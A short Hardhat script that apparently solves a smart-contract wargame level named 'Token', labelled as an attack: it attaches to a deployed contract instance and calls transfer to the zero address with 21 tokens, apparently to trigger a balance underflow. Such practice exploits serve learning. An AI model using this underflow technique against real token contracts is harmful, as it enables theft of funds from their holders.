const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x3eBD98E0f67aA903dBcA0f9773BBB35742144E07";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Token");
  const contract = Contract.attach(instanceAddress);

  // Attack

  const tx = await contract.transfer(ethers.constants.AddressZero, 21);
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
